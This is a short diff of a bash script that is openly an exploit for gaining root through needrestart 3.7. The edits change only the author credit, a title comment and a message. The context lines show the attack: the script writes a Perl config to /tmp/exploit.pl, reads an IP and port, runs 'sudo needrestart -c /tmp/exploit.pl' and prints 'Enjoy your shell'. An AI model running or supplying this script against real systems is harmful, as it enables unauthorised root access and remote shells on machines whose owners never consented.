@@ -1,5 +1,9 @@
 #!/bin/bash
-# Author 0xmrsecurity
+
+# Author SURAJ AKA 0xmrsecurity
+# needrestart Version 3.7 (Alternative way to root it)
+
+
 echo -e "[*] Creating Exploit.pl file...."
 echo -e "[*] Reading Details....."
 # Reading ip and port 
@@ -22,4 +26,4 @@ echo -e "[*] Executing command.."
 # Run  needrestart service with provided  config file .
 sudo needrestart -c /tmp/exploit.pl
 # Got shell after run this !
-echo -e "[*] Successfully Execute the shell commands!!! Enjoy your shell"
+echo -e "[*] Successfully Execute the shell commands !!! Enjoy your shell"
